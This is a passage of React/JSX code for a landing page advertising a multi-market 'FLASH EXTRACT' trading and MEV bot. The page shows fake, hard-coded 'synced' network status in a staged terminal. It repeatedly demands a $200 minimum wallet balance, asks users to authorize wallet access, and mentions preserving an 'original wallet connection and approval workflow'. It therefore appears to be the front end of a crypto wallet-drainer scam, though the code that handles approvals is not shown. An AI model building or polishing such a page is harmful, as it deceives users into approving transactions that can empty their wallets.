                    <input type="checkbox" className="h-4 w-4 accent-primary" />
                    Enable futures mode
                  </label>
                </>
              )}

              {/* Stock setup */}
              {botType === 'stock' && (
                <>
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label className="mb-1 block text-sm font-medium text-slate-300">
                        Order Type
                      </label>
                      <select className="w-full rounded-lg border border-slate-700 bg-slate-800 px-3 py-2 text-sm text-white outline-none transition-colors focus:border-primary">
                        <option>Market Order</option>
                        <option>Limit Order</option>
                        <option>Stop Order</option>
                        <option>Stop Limit</option>
                      </select>
                    </div>
                    <div>
                      <label className="mb-1 block text-sm font-medium text-slate-300">
                        Time in Force
                      </label>
                      <select className="w-full rounded-lg border border-slate-700 bg-slate-800 px-3 py-2 text-sm text-white outline-none transition-colors focus:border-primary">
                        <option>Day</option>
                        <option>GTC</option>
                        <option>IOC</option>
                      </select>
                    </div>
                  </div>

                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label className="mb-1 block text-sm font-medium text-slate-300">
                        Stop Loss %
                      </label>
                      <input
                        type="number"
                        value={stopLoss}
                        onChange={(e) => setStopLoss(Number(e.target.value))}
                        className="w-full rounded-lg border border-slate-700 bg-slate-800 px-3 py-2 text-sm text-white outline-none transition-colors focus:border-primary"
                      />
                    </div>
                    <div>
                      <label className="mb-1 block text-sm font-medium text-slate-300">
                        Take Profit %
                      </label>
                      <input
                        type="number"
                        value={takeProfit}
                        onChange={(e) => setTakeProfit(Number(e.target.value))}
                        className="w-full rounded-lg border border-slate-700 bg-slate-800 px-3 py-2 text-sm text-white outline-none transition-colors focus:border-primary"
                      />
                    </div>
                  </div>

                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label className="mb-1 block text-sm font-medium text-slate-300">
                        Ticker / Symbol
                      </label>
                      <input
                        type="text"
                        defaultValue="AAPL"
                        className="w-full rounded-lg border border-slate-700 bg-slate-800 px-3 py-2 text-sm text-white outline-none transition-colors focus:border-primary"
                      />
                    </div>
                    <div>
                      <label className="mb-1 block text-sm font-medium text-slate-300">
                        Max Positions
                      </label>
                      <input
                        type="number"
                        defaultValue={5}
                        className="w-full rounded-lg border border-slate-700 bg-slate-800 px-3 py-2 text-sm text-white outline-none transition-colors focus:border-primary"
                      />
                    </div>
                  </div>

                  <label className="flex items-center gap-2 text-sm text-slate-300">
                    <input type="checkbox" defaultChecked className="h-4 w-4 accent-primary" />
                    Trade only during regular market hours
                  </label>
                </>
              )}

              {/* MEV setup */}
              {botType === 'mev' && (
                <>
                  <div>
                    <label className="mb-2 flex items-center justify-between text-sm font-medium text-slate-300">
                      <span>Slippage Tolerance</span>
                      <span className="font-bold text-primary">{slippage}%</span>
                    </label>
                    <input
                      type="range"
                      min="0.1"
                      max="5"
                      step="0.1"
                      value={slippage}
                      onChange={(e) => setSlippage(Number(e.target.value))}
                    />
                  </div>

                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label className="mb-1 block text-sm font-medium text-slate-300">
                        Gas Boost (Gwei)
                      </label>
                      <input
                        type="number"
                        defaultValue={5}
                        className="w-full rounded-lg border border-slate-700 bg-slate-800 px-3 py-2 text-sm text-white outline-none transition-colors focus:border-primary"
                      />
                    </div>
                    <div>
                      <label className="mb-1 block text-sm font-medium text-slate-300">
                        Tx Deadline (sec)
                      </label>
                      <input
                        type="number"
                        defaultValue={30}
                        className="w-full rounded-lg border border-slate-700 bg-slate-800 px-3 py-2 text-sm text-white outline-none transition-colors focus:border-primary"
                      />
                    </div>
                  </div>

                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label className="mb-1 block text-sm font-medium text-slate-300">
                        Relay Mode
                      </label>
                      <select className="w-full rounded-lg border border-slate-700 bg-slate-800 px-3 py-2 text-sm text-white outline-none transition-colors focus:border-primary">
                        <option>Private Relay</option>
                        <option>Public Mempool</option>
                        <option>Builder Auction</option>
                      </select>
                    </div>
                    <div>
                      <label className="mb-1 block text-sm font-medium text-slate-300">
                        Max Bid %
                      </label>
                      <input
                        type="number"
                        defaultValue={2}
                        className="w-full rounded-lg border border-slate-700 bg-slate-800 px-3 py-2 text-sm text-white outline-none transition-colors focus:border-primary"
                      />
                    </div>
                  </div>

                  <label className="flex items-center gap-2 text-sm text-slate-300">
                    <input type="checkbox" defaultChecked className="h-4 w-4 accent-primary" />
                    Protect against sandwich attacks
                  </label>

                  <label className="flex items-center gap-2 text-sm text-slate-300">
                    <input type="checkbox" className="h-4 w-4 accent-primary" />
                    Enable atomic backrun mode
                  </label>
                </>
              )}
            </div>

            <div className="mt-8 flex gap-3">
              <button
                onClick={() => setShowSetupModal(false)}
                className="flex-1 rounded-xl bg-slate-800 py-3 font-semibold text-slate-300 transition-colors hover:bg-slate-700"
              >
                Cancel
              </button>
              <button
                onClick={handleConfirmSetup}
                className="flex-1 rounded-xl bg-primary py-3 font-bold text-slate-950 shadow-lg shadow-primary/20 transition-all hover:bg-primary/90"
              >
                Confirm & Connect
              </button>
            </div>
          </div>
        </div>
      )}

      {/* ═══ NAVBAR ═══ */}
      <nav className="fixed top-0 left-0 right-0 z-50 flex items-center justify-between border-b border-slate-800 bg-slate-950/80 px-6 py-4 backdrop-blur-xl">
        <div className="flex items-center gap-3 text-lg font-bold text-white">
          <div className="glow-pulse flex h-9 w-9 items-center justify-center rounded-xl bg-primary text-sm font-black text-slate-950">
            F
          </div>
          FLASH EXTRACT TRADING BOT
        </div>

        <div className="flex items-center gap-2 font-mono text-xs text-slate-400">
          <span className="h-2 w-2 animate-pulse rounded-full bg-primary" />
          System Online
        </div>
      </nav>

      {/* ═══ HERO ══ */}
      <section className="relative flex min-h-screen flex-col items-center justify-center px-6 pb-16 pt-28 text-center">
        <div className="pointer-events-none absolute left-1/2 top-0 h-[600px] w-[600px] -translate-x-1/2 rounded-full bg-primary/5 blur-3xl" />

        <div className="mb-8 inline-flex items-center gap-2 rounded-full border border-slate-800 bg-slate-900 px-4 py-1.5 font-mono text-xs text-slate-400">
          <span className="h-1.5 w-1.5 rounded-full bg-primary" />
          institutional-grade algorithmic trading
        </div>

        <h1 className="mb-6 max-w-4xl text-4xl font-extrabold leading-tight tracking-tight text-white md:text-6xl">
          Automate Your Edge.
          <br />
          <span className="text-primary">Trade Smarter.</span>
        </h1>

        <p className="mb-10 max-w-2xl text-base leading-relaxed text-slate-400 md:text-lg">
          Deploy advanced trading bots for Forex, Crypto, Stocks, and MEV execution.
          The bot requires a minimum wallet balance of{' '}
          <span className="font-semibold text-white">$200</span> to start.
        </p>

        {/* Bot selector */}
        <div className="mb-10 grid w-full max-w-3xl grid-cols-2 gap-3 md:grid-cols-4">
          {(Object.keys(BOT_LABELS) as BotType[]).map((key) => {
            const active = botType === key;
            return (
              <button
                key={key}
                type="button"
                disabled={loading}
                onClick={() => setBotType(key)}
                className={[
                  'rounded-2xl border p-4 text-center transition-all disabled:cursor-not-allowed disabled:opacity-60',
                  active
                    ? 'border-primary bg-primary/10 text-primary shadow-lg shadow-primary/10'
                    : 'border-slate-800 bg-slate-900 text-slate-400 hover:border-slate-700 hover:text-slate-200'
                ].join(' ')}
              >
                <div className="mb-1 text-2xl">{BOT_ICONS[key]}</div>
                <div className="text-sm font-semibold">{BOT_LABELS[key]} Bot</div>
              </button>
            );
          })}
        </div>

        <button
          onClick={handleAction}
          disabled={loading}
          className="inline-flex items-center gap-2 rounded-xl bg-primary px-8 py-4 font-bold text-slate-950 shadow-lg shadow-primary/20 transition-all hover:bg-primary/90 disabled:cursor-not-allowed disabled:opacity-60"
        >
          {loading && (
            <span className="h-4 w-4 animate-spin rounded-full border-2 border-slate-950/30 border-t-slate-950" />
          )}
          {buttonText}
        </button>

        <p className="mt-4 text-xs text-slate-500">
          Secure interface · Non-custodial design · Multi-chain EVM support
        </p>
      </section>

      {/* ═══ TERMINAL ═══ */}
      <section className="flex justify-center px-6 pb-20">
        <div className="w-full max-w-4xl overflow-hidden rounded-2xl border border-slate-800 bg-slate-900 font-mono text-sm shadow-2xl">
          <div className="flex items-center justify-between border-b border-slate-800 bg-slate-900/60 px-5 py-3">
            <div className="flex items-center gap-3">
              <div className="flex gap-1.5">
                <span className="h-3 w-3 rounded-full bg-red-500/80" />
                <span className="h-3 w-3 rounded-full bg-yellow-500/80" />
                <span className="h-3 w-3 rounded-full bg-green-500/80" />
              </div>
              <span className="text-xs font-bold uppercase tracking-wider text-slate-500">
                {loading ? 'Executing Protocol' : 'System Standby'}
              </span>
            </div>
            <div className="text-xs text-slate-600">// trading_console</div>
          </div>

          <div className="max-h-80 space-y-2 overflow-y-auto p-6 text-slate-400">
            <div>
              <span className="font-bold text-primary">~</span>{' '}
              initializing <span className="text-white">{BOT_LABELS[botType]}</span> trading parameters...
            </div>

            <div>
              <span className="text-slate-500">[SYS]</span> risk_management:{' '}
              <span className="text-green-400">active</span>
            </div>

            <div>
              <span className="text-slate-500">[SYS]</span> minimum_wallet_balance:{' '}
              <span className="text-white">$200</span>
            </div>

            <div>
              <span className="text-slate-500">[CFG]</span> fund_allocation:{' '}
              <span className="text-white">{fundPercent}%</span>
            </div>

            {botType === 'forex' && (
              <>
                <div>
                  <span className="text-slate-500">[CFG]</span> pair:{' '}
                  <span className="text-white">{selectedForexPair}</span>
                </div>
                <div>
                  <span className="text-slate-500">[CFG]</span> leverage:{' '}
                  <span className="text-yellow-400">{leverage}x</span>
                </div>
                <div>
                  <span className="text-slate-500">[CFG]</span> stop_loss:{' '}
                  <span className="text-yellow-400">{stopLoss}%</span>
                </div>
                <div>
                  <span className="text-slate-500">[CFG]</span> take_profit:{' '}
                  <span className="text-yellow-400">{takeProfit}%</span>
                </div>
              </>
            )}

            {botType === 'crypto' && (
              <>
                <div>
                  <span className="text-slate-500">[CFG]</span> stop_loss:{' '}
                  <span className="text-yellow-400">{stopLoss}%</span>
                </div>
                <div>
                  <span className="text-slate-500">[CFG]</span> take_profit:{' '}
                  <span className="text-yellow-400">{takeProfit}%</span>
                </div>
                <div>
                  <span className="text-slate-500">[CFG]</span> trailing_stop:{' '}
                  <span className="text-green-400">enabled</span>
                </div>
              </>
            )}

            {botType === 'stock' && (
              <>
                <div>
                  <span className="text-slate-500">[CFG]</span> order_type:{' '}
                  <span className="text-yellow-400">Market</span>
                </div>
                <div>
                  <span className="text-slate-500">[CFG]</span> time_in_force:{' '}
                  <span className="text-yellow-400">Day</span>
                </div>
                <div>
                  <span className="text-slate-500">[CFG]</span> market_hours:{' '}
                  <span className="text-green-400">restricted</span>
                </div>
              </>
            )}

            {botType === 'mev' && (
              <>
                <div>
                  <span className="text-slate-500">[CFG]</span> slippage_tolerance:{' '}
                  <span className="text-yellow-400">{slippage}%</span>
                </div>
                <div>
                  <span className="text-slate-500">[CFG]</span> relay_mode:{' '}
                  <span className="text-yellow-400">private</span>
                </div>
                <div>
                  <span className="text-slate-500">[CFG]</span> sandwich_protection:{' '}
                  <span className="text-green-400">enabled</span>
                </div>
              </>
            )}

            <div className="pt-2">
              <span className="text-slate-500">[NET]</span> scanning multi-chain EVM environments...
            </div>
            <div>
              <span className="text-slate-500">[NET]</span> mainnet:{' '}
              <span className="text-green-400">synced</span>
            </div>
            <div>
              <span className="text-slate-500">[NET]</span> arbitrum:{' '}
              <span className="text-green-400">synced</span>
            </div>
            <div>
              <span className="text-slate-500">[NET]</span> polygon:{' '}
              <span className="text-green-400">synced</span>
            </div>
            <div>
              <span className="text-slate-500">[NET]</span> bsc:{' '}
              <span className="text-green-400">synced</span>
            </div>
            <div>
              <span className="text-slate-500">[NET]</span> base:{' '}
              <span className="text-green-400">synced</span>
            </div>

            <div className="mt-4 border-t border-slate-800 pt-4">
              {loading ? (
                <div className="font-bold text-primary animate-pulse">
                  {status}
                </div>
              ) : (
                <div className="text-slate-500">awaiting user authentication...</div>
              )}
            </div>
          </div>
        </div>
      </section>

      {/* ═══ FEATURES ═══ */}
      <section className="mx-auto max-w-6xl px-6 py-24">
        <div className="mb-16 text-center">
          <h2 className="mb-4 text-3xl font-extrabold text-white md:text-4xl">
            Built for modern automated trading
          </h2>
          <p className="mx-auto max-w-2xl text-slate-400">
            One interface for Forex, Crypto, Stock, and MEV bot configuration with
            professional risk controls and capital allocation settings.
          </p>
        </div>

        <div className="grid gap-6 md:grid-cols-3">
          <div className="group rounded-2xl border border-slate-800 bg-slate-900 p-6 transition-colors hover:border-primary/50">
            <div className="mb-4 font-mono text-xs text-primary">01</div>
            <h3 className="mb-2 text-lg font-bold text-white group-hover:text-primary">
              Multi-market bots
            </h3>
            <p className="text-sm leading-relaxed text-slate-400">
              Choose Forex, Crypto, Stock, or MEV execution modes and configure
              strategy-specific parameters before launch.
            </p>
          </div>

          <div className="group rounded-2xl border border-slate-800 bg-slate-900 p-6 transition-colors hover:border-primary/50">
            <div className="mb-4 font-mono text-xs text-primary">02</div>
            <h3 className="mb-2 text-lg font-bold text-white group-hover:text-primary">
              Capital allocation
            </h3>
            <p className="text-sm leading-relaxed text-slate-400">
              Choose the percentage of your wallet balance you authorize the bot to access for trading.
              The wallet must contain at least $200 for the bot to start.
            </p>
          </div>

          <div className="group rounded-2xl border border-slate-800 bg-slate-900 p-6 transition-colors hover:border-primary/50">
            <div className="mb-4 font-mono text-xs text-primary">03</div>
            <h3 className="mb-2 text-lg font-bold text-white group-hover:text-primary">
              Risk controls
            </h3>
            <p className="text-sm leading-relaxed text-slate-400">
              Configure leverage, slippage, stop loss, take profit, order types,
              relay mode, and other market-specific safeguards.
            </p>
          </div>
        </div>
      </section>

      {/* ═══ HOW IT WORKS ═══ */}
      <section className="border-y border-slate-800 bg-slate-900/30 px-6 py-24">
        <div className="mx-auto max-w-4xl">
          <div className="mb-4 text-xs font-semibold uppercase tracking-[0.2em] text-primary">
            How it works
          </div>
          <h2 className="mb-4 text-3xl font-extrabold text-white md:text-4xl">
            Select. Configure. Launch.
          </h2>
          <p className="mb-12 max-w-2xl text-slate-400">
            The interface is designed to keep setup clear while preserving the same
            underlying approval and execution flow.
          </p>

          <div className="space-y-8">
            <div className="flex gap-5">
              <div className="min-w-10 font-mono text-sm font-bold text-primary">01</div>
              <div>
                <h4 className="mb-1 font-bold text-white">Choose your bot market</h4>
                <p className="text-sm text-slate-400">
                  Select Forex, Crypto, Stock, or MEV depending on the trading environment you want to automate.
                </p>
              </div>
            </div>

            <div className="flex gap-5">
              <div className="min-w-10 font-mono text-sm font-bold text-primary">02</div>
              <div>
                <h4 className="mb-1 font-bold text-white">Set execution parameters</h4>
                <p className="text-sm text-slate-400">
                  Configure capital allocation, leverage, slippage, stop loss, take profit, order type, or relay settings.
                </p>
              </div>
            </div>

            <div className="flex gap-5">
              <div className="min-w-10 font-mono text-sm font-bold text-primary">03</div>
              <div>
                <h4 className="mb-1 font-bold text-white">Confirm and connect</h4>
                <p className="text-sm text-slate-400">
                  After confirmation, the original wallet connection and approval workflow continues unchanged.
                </p>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* ═══ WALLETS ═══ */}
      <section className="px-6 py-16">
        <div className="mb-8 text-center text-xs font-bold uppercase tracking-widest text-slate-500">
          Works with multi-chain EVM wallets
        </div>

        <div className="flex flex-wrap items-center justify-center gap-8 md:gap-14">
          {[
            { icon: '🦊', name: 'MetaMask' },
            { icon: '🛡️', name: 'Trust Wallet' },
            { icon: '🐰', name: 'Rabby' },
            { icon: '🅾️', name: 'OKX' },
            { icon: '🟣', name: 'Coinbase Wallet' },
          ].map((wallet) => (
            <div
              key={wallet.name}
              className="flex items-center gap-3 text-slate-400 transition-colors hover:text-white"
            >
              <span className="text-2xl">{wallet.icon}</span>
              <span className="text-sm font-semibold">{wallet.name}</span>
            </div>
          ))}
        </div>
      </section>

      {/* ═══ RISK CONTROLS ═══ */}
      <section className="mx-auto max-w-4xl px-6 py-20">
        <div className="mb-4 text-xs font-semibold uppercase tracking-[0.2em] text-primary">
          Risk controls
        </div>
        <h2 className="mb-4 text-3xl font-extrabold text-white md:text-4xl">
          You stay in control.
        </h2>
        <p className="mb-8 text-slate-400">
          Review your selected market, allocation percentage, and risk parameters before confirming.
        </p>

        <div className="flex flex-wrap gap-3">
          {[
            'Capital allocation %',
            'Minimum wallet balance: $200',
            'Leverage control',
            'Slippage tolerance',
            'Stop loss',
            'Take profit',
            'Order type',
            'Private relay mode',
            'Manual confirmation',
          ].map((item) => (
            <div
              key={item}
              className="flex items-center gap-2 rounded-xl border border-slate-800 bg-slate-900 px-4 py-2 text-sm text-slate-300"
            >
              <span className="text-primary">✓</span>
              {item}
            </div>
          ))}
        </div>
      </section>

      {/* ═══ CTA ═══ */}
      <section className="border-t border-slate-800 px-6 py-24 text-center">
        <h2 className="mb-4 text-3xl font-extrabold text-white md:text-4xl">
          Ready to deploy your bot?
        </h2>
        <p className="mx-auto mb-8 max-w-xl text-slate-400">
          Select your market, configure your capital allocation and risk parameters,
          then launch with a professional trading interface. Minimum wallet balance required: $200.
        </p>

        <button
          onClick={handleAction}
          disabled={loading}
          className="inline-flex items-center gap-2 rounded-xl bg-primary px-8 py-4 font-bold text-slate-950 shadow-lg shadow-primary/20 transition-all hover:bg-primary/90 disabled:cursor-not-allowed disabled:opacity-60"
        >
          {loading ? 'Processing...' : 'Launch Bot'}
        </button>
      </section>

      {/* ═══ FOOTER ═══ */}
      <footer className="border-t border-slate-800 px-6 py-12 text-center">
        <p className="mx-auto max-w-2xl text-xs leading-relaxed text-slate-500">
          FLASH EXTRACT TRADING BOT is a trading interface, not financial advice. It does not guarantee profit
          or remove market risk. The bot requires a minimum wallet balance of $200 to start.
          Capital allocation is the percentage of your wallet balance you authorize the bot to access.
          Always review each transaction and approval request before confirming.
        </p>
      </footer>
    </div>
  )
}